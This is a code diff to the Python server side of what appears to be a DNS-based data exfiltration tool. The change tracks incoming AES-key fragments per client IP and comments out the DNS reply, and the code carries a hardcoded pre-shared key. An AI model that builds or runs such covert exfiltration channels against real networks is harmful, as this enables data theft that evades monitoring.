@@ -51,18 +51,22 @@ class PacketsOutOfOrderException(Exception):
 psk = b"thisisaverysecurekey123456789012"  # Must match the client's PSK
 
 
-# Initialize received_fragments as a list to maintain order
-received_fragments = []
+# Initialize received_fragments as a dictionary to map IP addresses to their fragments
+received_fragments = {}
 
 # AES decryption for the key exchange (PSK-based)
-def decrypt_with_psk(encrypted_data, psk):
+def decrypt_with_psk(encrypted_data, psk, ip):
     global received_fragments
+    
+    # Initialize the fragment list for the IP if it doesn't exist
+    if ip not in received_fragments:
+        received_fragments[ip] = []
 
-    if encrypted_data in received_fragments:
+    if encrypted_data in received_fragments[ip]:
         return None, False  # Skip duplicate fragments
 
-    received_fragments.append(encrypted_data)
-    complete_aes_key = "".join(received_fragments)
+    received_fragments[ip].append(encrypted_data)
+    complete_aes_key = "".join(received_fragments[ip])
 
     # Add base64 padding if necessary
     missing_padding = len(complete_aes_key) % 4
@@ -91,6 +95,7 @@ def decrypt_with_psk(encrypted_data, psk):
         return None, False
 
 
+# TODO: CHECK IF NEEDED
 def decode_base64_with_padding(data):
     # Add padding if necessary
     missing_padding = len(data) % 4
@@ -223,7 +228,7 @@ def handle_query(pkt, domain, data_parsers):
     if data:
         # Step 1: If the client doesn't have an AES key yet, decrypt it with the PSK
         if pkt[IP].src not in clients:
-            aes_key, completed_key = decrypt_with_psk(data, psk)
+            aes_key, completed_key = decrypt_with_psk(data, psk, pkt[IP].src)
             
             # To check if the full key is received (ends with "==")
             if completed_key == True: 
@@ -240,9 +245,10 @@ def handle_query(pkt, domain, data_parsers):
     else:
         print("[SERVER] No valid exfiltration data found.")
 
+    # TODO: CHECK IF WORKS TO RETURN TO CLIENT
     # Send a basic OK response to acknowledge
     response = create_response("127.0.0.1", pkt)
-    send(response)
+    # send(response)
 
 
 # Creates a DNS response to the query
